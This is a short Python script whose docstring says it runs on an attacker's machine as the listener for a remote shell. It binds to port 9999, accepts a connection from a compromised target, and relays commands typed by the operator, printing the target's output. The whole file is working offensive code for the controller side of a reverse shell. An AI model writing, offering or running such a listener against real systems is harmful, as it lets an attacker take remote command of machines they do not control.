"""
Author: Ahad Sheriff
Server.py is script that runs on a an attackers host machine. Listens for incoming connections to establish a remote shell.
"""

import socket
import sys

def socketCreate():
    try:
        global host
        global port
        global sock

        # ip address of listening machine. blank for localhost
        host = ''
        port = 9999
        # Actual socket or conversation between server and target machine
        sock = socket.socket()

    except socket.error as message:
        print("Socket creation error: " + str(message))


def socketBind():
    # Bind the socket to a port and wait for a connection from a client """
    try:
        global host
        global port
        global sock
        print("Binding socket to port: " + str(port))
        sock.bind((host, port))
        # max 5 bad connections it will take before refusing any new connections
        sock.listen(5)

    except socket.error as message:
        print("Socket binding error: " + str(message) + "\n" +
              "Retrying...")
        socketBind()


# Accept connections. Will establish connections with a client. However, socket must be listening 
def socketAccept():
    # Will not continue with code unless connection is established with client
    connection, address = sock.accept()
    print("Connection has been established | " + "IP: " +
          address[0] + " | Port: " + str(address[1]))
    sendCommands(connection)
    connection.close()

def sendCommands(connection):
    while True:
        command = input()
        if command == 'quit':
            connection.close()
            sock.close()
            sys.exit()

        # Encode = convert to string, to send to user
        # Decode = revert to byte, to send across network
        if len(str.encode(command)) > 0:
            connection.send(str.encode(command))
            clientResponse = str(connection.recv(1024), "utf-8")
            # end="" -> don't add new line after command. Better notation for emulating command prompt.
            print(clientResponse, end="")


if __name__ == "__main__":
    socketCreate()
    socketBind()
    socketAccept()
